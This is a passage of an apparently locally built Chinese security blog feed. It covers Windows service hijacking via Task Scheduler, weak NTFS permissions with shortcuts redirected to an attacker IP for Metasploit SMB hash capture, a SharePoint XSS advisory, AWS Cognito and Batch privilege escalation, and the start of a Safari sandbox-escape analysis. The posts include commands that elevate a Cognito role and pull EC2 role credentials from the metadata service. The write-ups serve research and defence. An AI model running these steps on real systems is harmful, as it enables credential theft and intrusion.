&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;RpcRevertToSelf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FALSE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;IsPrincipalAllowed&lt;/code&gt;函数首先检查调用者是否是管理员或SYSTEM。如果是，则允许任何主体（同样不完全正确，但足够好）。接下来检查主体的用户SID是否与我们设置的SID匹配。这将允许NS/LS或虚拟服务账户指定以自己用户账户身份运行的任务。&lt;/p&gt;
&lt;p&gt;最后，如果主体是服务SID，则尝试在模拟调用者的同时为服务打开完全访问权限。如果成功，则允许使用服务SID作为主体。这种行为很有趣，因为它为滥用配置不当的服务提供了一种隐蔽的方式。&lt;/p&gt;
&lt;p&gt;检查权限提升的一个众所周知的方法是枚举所有本地服务，并查看是否有任何服务授予普通用户特权访问权限（主要是SERVICE_CHANGE_CONFIG）。这足以劫持服务并让任意代码以服务账户身份运行。一个常见的技巧是更改可执行路径并重新启动服务，但这有几个不好的原因：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;更改可执行路径很容易被发现。&lt;/li&gt;
&lt;li&gt;你可能希望之后将路径修复回来，这很麻烦。&lt;/li&gt;
&lt;li&gt;如果服务当前正在运行，你需要停止服务，然后重新启动修改后的服务以获得代码执行。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但是，只要你的账户被授予对服务的完全访问权限，你就可以使用任务计划程序（即使不是管理员）以服务用户账户（如SYSTEM）身份运行代码，而无需直接修改服务的配置或停止/启动服务。这更加隐蔽。当然，这意味着任务运行的令牌可能会被剥离权限等，但这很容易处理（只要它不是写限制的）。&lt;/p&gt;
&lt;p&gt;这是一个很好的教训，告诉我们永远不要只看表面价值。我假设调用者需要管理员权限才能将服务账户设置为任务的主体。但深入研究代码后，似乎实际上并不需要。希望有人会觉得这有用。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>如何利用薄弱的NTFS权限进行渗透测试</title>
        <link>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E8%96%84%E5%BC%B1%E7%9A%84ntfs%E6%9D%83%E9%99%90%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
        <pubDate>Tue, 05 Aug 2025 21:55:36 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E8%96%84%E5%BC%B1%E7%9A%84ntfs%E6%9D%83%E9%99%90%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
        <description>&lt;h1 id=&#34;如何利用薄弱的ntfs权限&#34;&gt;如何利用薄弱的NTFS权限
&lt;/h1&gt;&lt;p&gt;薄弱的NTFS权限可能导致目标环境中多种攻击，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问敏感信息&lt;/li&gt;
&lt;li&gt;修改系统二进制文件和配置文件&lt;/li&gt;
&lt;li&gt;DLL劫持等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些是渗透测试人员通常会考虑的攻击方式。然而，当我们只有有限权限时，还有其他机会可以寻找，尤其是在权限提升或横向移动受到限制的环境中。&lt;/p&gt;
&lt;h2 id=&#34;方法适用场景&#34;&gt;方法适用场景
&lt;/h2&gt;&lt;p&gt;该方法适用于因补偿控制而导致权限提升或横向移动受限的环境。建议在使用此方法前，先尝试密码喷洒和使用PowerUp等工具进行主机评估。&lt;/p&gt;
&lt;h2 id=&#34;寻找敏感位置&#34;&gt;寻找敏感位置
&lt;/h2&gt;&lt;p&gt;我们需要在环境中寻找哪些类型的访问权限？在这种情况下，我们关注的是能够写入可能让其他用户（或扫描器）执行内容的位置。&lt;/p&gt;
&lt;p&gt;通常，我们会寻找用于漫游配置文件、文件夹重定向或用户主目录的共享。管理员配置这些解决方案是为了便于访问、备份个人用户内容以及支持远程访问和虚拟化。&lt;/p&gt;
&lt;h3 id=&#34;文件夹重定向&#34;&gt;文件夹重定向
&lt;/h3&gt;&lt;p&gt;文件夹重定向可以通过组策略配置。更多详情可参考：&lt;a class=&#34;link&#34; href=&#34;https://technet.microsoft.com/en-us/library/cc732275%28v=ws.11%29.aspx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;微软Technet文档&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;漫游配置文件&#34;&gt;漫游配置文件
&lt;/h3&gt;&lt;p&gt;漫游配置文件可以在用户的Active Directory账户设置中配置。通常会指定一个网络共享来存储所有用户的配置文件信息。&lt;/p&gt;
&lt;p&gt;更多详情可参考：&lt;a class=&#34;link&#34; href=&#34;https://technet.microsoft.com/en-us/library/jj649079%28v=ws.11%29.aspx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;微软Technet文档&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;主文件夹&#34;&gt;主文件夹
&lt;/h3&gt;&lt;p&gt;在同一对话框中，我们可以看到指定用户主文件夹的字段。主文件夹通常也是一个共享位置，但可能不包含我们攻击目标中的项目（如快捷方式或收藏夹），但如果具有写入权限，仍然是一个有价值的位置。&lt;/p&gt;
&lt;h2 id=&#34;定位敏感位置&#34;&gt;定位敏感位置
&lt;/h2&gt;&lt;p&gt;一旦进入环境，如何找到这些敏感位置？可以使用PowerView的&lt;code&gt;Get-UserProperties&lt;/code&gt;命令来查询&amp;quot;Profile Path&amp;quot;和&amp;quot;Home Folder&amp;quot;属性。&lt;/p&gt;
&lt;p&gt;定位用于文件夹重定向的共享文件夹更为困难。需要搜索SYSVOL共享以查找文件夹重定向策略，除非使用的用户账户已应用文件夹重定向。此时，可以检查相关INI文件以确定文件夹重定向目标。&lt;/p&gt;
&lt;p&gt;使用PowerView的&lt;code&gt;Invoke-ShareFinder&lt;/code&gt;命令（带&lt;code&gt;CheckShareAccess&lt;/code&gt;开关）或类似工具可以确定可访问文件夹的位置。使用方法可参考以下博客：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Veil PowerView使用指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.veil-framework.com/hunting-sensitive-data-veil-framework/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;使用Veil框架狩猎敏感数据&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;执行攻击&#34;&gt;执行攻击
&lt;/h2&gt;&lt;p&gt;找到可写位置后，可以执行哪些攻击？一些明显的攻击包括修改&amp;quot;My Documents&amp;quot;文件夹中的常用文件，例如添加恶意宏（如unicorn.py生成的PowerShell宏）。&lt;/p&gt;
&lt;p&gt;或者，可以使用msfvenom等工具后门现有可执行文件，如&lt;a class=&#34;link&#34; href=&#34;https://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Offensive Security文档&lt;/a&gt;所述。&lt;/p&gt;
&lt;p&gt;这两种方法都希望用户执行内容，从而在环境中获得额外的会话和扩展访问权限。&lt;/p&gt;
&lt;h2 id=&#34;使用metasploit捕获smb哈希&#34;&gt;使用Metasploit捕获SMB哈希
&lt;/h2&gt;&lt;p&gt;我们将探索另一种方法：使用Metasploit的&lt;code&gt;auxiliary/server/capture/smb&lt;/code&gt;模块。该模块用于通过恶意SMB服务器收集哈希以进行破解。&lt;/p&gt;
&lt;p&gt;模块选项包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SRVHOST&lt;/code&gt;和&lt;code&gt;SRVPORT&lt;/code&gt;：设置服务器的IP地址和端口&lt;/li&gt;
&lt;li&gt;输出文件格式：支持Cain&amp;amp;Abel或John the Ripper格式&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;设置模块选项后，执行&lt;code&gt;run&lt;/code&gt;命令启动服务器。SMB服务器将在后台监听，并在收到SMB哈希时报告并将其记录到指定的输出文件。&lt;/p&gt;
&lt;h2 id=&#34;修改快捷方式或收藏夹&#34;&gt;修改快捷方式或收藏夹
&lt;/h2&gt;&lt;p&gt;攻击者可以修改可写目录中的快捷方式或收藏夹，使用户连接到恶意服务器并传递哈希。例如，检查用户的收藏夹可能会发现类似以下内容：&lt;/p&gt;
&lt;p&gt;攻击者将正确的URL（如&lt;code&gt;http://www.bing.com&lt;/code&gt;）替换为攻击者的IP地址和适当协议（如&lt;code&gt;file://172.16.189.131/&lt;/code&gt;）。当目标用户执行修改后的快捷方式或收藏夹时，计算机会自动尝试与服务器进行挑战响应身份验证。&lt;/p&gt;
&lt;p&gt;Metasploit会在控制台显示这些尝试并将其记录到指定的输出文件。捕获的哈希可以传输到密码破解工具以恢复用户凭据。&lt;/p&gt;
&lt;h2 id=&#34;注意事项&#34;&gt;注意事项
&lt;/h2&gt;&lt;p&gt;修改后的快捷方式将无法正常工作，但这可能会被最终用户忽略。此外，修改后的文件可能会从执行认证漏洞扫描的扫描账户捕获凭据。如果扫描账户具有管理员权限且未使用强密码，可能会快速获得成功。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SharePoint跨站脚本(XSS)漏洞安全通告发布</title>
        <link>http://localhost:1313/p/sharepoint%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8%E9%80%9A%E5%91%8A%E5%8F%91%E5%B8%83/</link>
        <pubDate>Tue, 05 Aug 2025 19:59:42 +0800</pubDate>
        
        <guid>http://localhost:1313/p/sharepoint%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8%E9%80%9A%E5%91%8A%E5%8F%91%E5%B8%83/</guid>
        <description>&lt;p&gt;微软今日发布安全通告983438，针对SharePoint Server 2007和SharePoint Services 3.0中存在的跨站脚本(XSS)漏洞。该漏洞可能导致攻击者在SharePoint站点内实现权限提升(EoP)。使用Internet Explorer 8客户端的服务器风险较低，因为IE8的XSS过滤器能在互联网区域缓解此问题。目前尚未发现活跃攻击。&lt;/p&gt;
&lt;p&gt;运行SharePoint Server 2007或SharePoint Services 3.0的客户应审阅并实施安全通告中讨论的缓解措施和临时解决方案，包括限制对SharePoint help.aspx XML文件的访问，以及在内部网区域启用IE8 XSS过滤器。&lt;/p&gt;
&lt;p&gt;微软正通过Microsoft Active Protections Program(MAPP)与合作伙伴积极协作，提供可扩展客户保护的解决方案信息。微软始终致力于与安全研究人员合作解决软件漏洞，确保用户在漏洞被恶意利用前获得全面高质量的安全更新。&lt;/p&gt;
&lt;p&gt;受影响用户可访问http://support.microsoft.com获取支持，并建议联系所在国家的执法机构。我们将通过博客和Twitter(@msftsecresponse)持续更新进展。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;本文档按&amp;quot;原样&amp;quot;提供，不附任何担保，亦不授予任何权利。&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>探索AWS Batch权限提升漏洞的技术分析</title>
        <link>http://localhost:1313/p/%E6%8E%A2%E7%B4%A2aws-batch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 01:56:38 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%8E%A2%E7%B4%A2aws-batch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;从上一期说起您解决cloudsectidbit第2期的iac实验了吗&#34;&gt;从上一期说起&amp;hellip;您解决CloudSecTidbit第2期的IaC实验了吗？
&lt;/h3&gt;&lt;p&gt;[解决方案]
AWS Cognito挑战的核心是通过权限提升获取管理员权限并读取内部用户列表。应用程序使用AWS Cognito颁发的会话令牌（保存为名为&lt;code&gt;aws-cognito-app-access-token&lt;/code&gt;的cookie），攻击者可以通过以下步骤实现提权：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws cognito-idp get-user --region us-east-1 --access-token &amp;lt;USER_ACCESS_TOKEN&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws --region us-east-1 cognito-idp update-user-attributes --user-attributes &lt;span class=&#34;s2&#34;&gt;&amp;#34;Name=custom:Role,Value=admin&amp;#34;&lt;/span&gt; --access-token &amp;lt;USER_ACCESS_TOKEN&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;漏洞根源在于平台过度信任&lt;code&gt;custom:Role&lt;/code&gt;属性进行授权判断。&lt;/p&gt;
&lt;h3 id=&#34;技术聚焦aws-batch权限提升研究&#34;&gt;技术聚焦：AWS Batch权限提升研究
&lt;/h3&gt;&lt;h4 id=&#34;aws-batch基础架构&#34;&gt;AWS Batch基础架构
&lt;/h4&gt;&lt;p&gt;AWS Batch是AWS提供的批处理计算服务，主要组件包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Jobs&lt;/strong&gt;：工作单元（脚本/可执行文件/容器镜像）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Job definitions&lt;/strong&gt;：任务蓝图（含IAM角色、资源需求等配置）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Job Queues&lt;/strong&gt;：任务调度队列&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Compute environments&lt;/strong&gt;：计算资源环境（支持Fargate/EC2/EKS三种编排类型）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;漏洞场景分析&#34;&gt;漏洞场景分析
&lt;/h4&gt;&lt;p&gt;在多租户平台中发现高危配置：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;所有租户任务均使用EC2编排类型运行&lt;/li&gt;
&lt;li&gt;计算环境EC2实例需要高权限角色管理EFS等资源&lt;/li&gt;
&lt;li&gt;任务容器具有&lt;code&gt;batch:RegisterJobDefinition&lt;/code&gt;和&lt;code&gt;batch:SubmitJob&lt;/code&gt;权限&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;攻击链分解&#34;&gt;攻击链分解
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;初始访问&lt;/strong&gt;：通过容器元数据服务（CMDS@169.254.170.2）获取任务执行角色凭证&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;权限滥用&lt;/strong&gt;：利用获得的凭证创建恶意任务定义&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络配置突破&lt;/strong&gt;：由于EC2环境默认使用主机网络模式，容器可访问实例元数据服务（IMDSv2）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;凭证窃取&lt;/strong&gt;：通过IMDS获取EC2实例的高权限角色凭证&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;技术验证过程&#34;&gt;技术验证过程
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;步骤1 - 获取实例角色名&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws batch register-job-definition &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --job-definition-name poc-get-rolename &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --type container &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --container-properties &lt;span class=&#34;s1&#34;&gt;&amp;#39;{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;image&amp;#34;: &amp;#34;curlimages/curl&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;command&amp;#34;: [&amp;#34;sh&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/&amp;#34;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;  }&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;步骤2 - 获取角色凭证&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws batch register-job-definition &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --job-definition-name poc-get-aimcreds &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --type container &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --container-properties &lt;span class=&#34;s1&#34;&gt;&amp;#39;{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;image&amp;#34;: &amp;#34;curlimages/curl&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;command&amp;#34;: [&amp;#34;sh&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME&amp;#34;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;  }&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;安全建议&#34;&gt;安全建议
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;审计人员检查清单&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;确认任务执行上下文是否限制IMDS访问&lt;/li&gt;
&lt;li&gt;审查EC2编排环境中的实例角色权限&lt;/li&gt;
&lt;li&gt;检查是否过度分配&lt;code&gt;RegisterJobDefinition/SubmitJob&lt;/code&gt;权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;开发者防护措施&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;网络层限制IMDS访问（通过&lt;code&gt;aws ec2 modify-instance-metadata-options&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;遵循最小权限原则配置任务角色&lt;/li&gt;
&lt;li&gt;考虑使用Fargate替代EC2编排类型&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;实践资源&#34;&gt;实践资源
&lt;/h3&gt;&lt;p&gt;漏洞复现环境已开源：&lt;a class=&#34;link&#34; href=&#34;https://github.com/doyensec/cloudsec-tidbits/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CloudSecTidbits实验室&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;延伸阅读&#34;&gt;延伸阅读
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://docs.aws.amazon.com/batch/latest/userguide/what-is-batch.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;AWS Batch官方文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.doyensec.com/2023/03/13/aws-metadata-service-container-security.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;容器工作负载中的元数据服务安全&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Pwn2Own Safari沙箱逃逸第一部分：获取root shell的技术分析</title>
        <link>http://localhost:1313/p/pwn2own-safari%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%E8%8E%B7%E5%8F%96root-shell%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 23:56:55 +0800</pubDate>
        
        <guid>http://localhost:1313/p/pwn2own-safari%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%E8%8E%B7%E5%8F%96root-shell%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;pwn2own-safari沙箱逃逸第一部分---获取root-shell&#34;&gt;Pwn2Own: Safari沙箱逃逸第一部分 - 获取root shell
&lt;/h1&gt;&lt;p&gt;今天我们将介绍CVE-2017-2533/ZDI-17-357漏洞，这是macOS系统服务中的一个竞争条件漏洞，可用于从本地管理员权限提升至root权限。我们在今年的Pwn2Own比赛中结合其他逻辑漏洞利用它来逃逸Safari沙箱。&lt;/p&gt;
&lt;p&gt;该漏洞存在于Disk Arbitration守护进程(diskarbitrationd)中，该进程负责管理macOS上的块设备。其IPC接口可以从Safari沙箱内部访问，这使其成为我们感兴趣的目标。通过利用此漏洞，我们可以将磁盘分区挂载到任何不受SIP保护的目录上。由于每台新款MacBook都有一个允许默认用户写入的小型FAT32恢复分区，这使我们能够将任意内容的文件放入文件系统并获得root权限。&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现&#34;&gt;漏洞发现
&lt;/h2&gt;&lt;p&gt;在Safari渲染器中实现代码执行后，我们的目标是横向移动到更高权限的系统进程，因此我们通过查看允许的mach查找列表(即可以通过mach IPC通信的服务)开始审计。该列表可以在沙箱规则文件&lt;code&gt;/System/Library/Frameworks/WebKit.framework/Versions/A/Resources/com.apple.WebProcess.sb&lt;/code&gt;中找到。&lt;/p&gt;
&lt;p&gt;列表中的第一个服务&lt;code&gt;com.apple.DiskArbitration.diskarbitrationd&lt;/code&gt;立即引起了我们的注意。Disk Arbitration是Apple负责管理(主要是挂载和卸载)块设备的框架，diskarbitrationd是处理相应IPC请求的服务。为什么浏览器渲染器需要挂载磁盘？这绝对值得进一步调查。&lt;/p&gt;
&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析
&lt;/h2&gt;&lt;p&gt;我们发现漏洞存在于DARequest.c文件的以下代码中：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
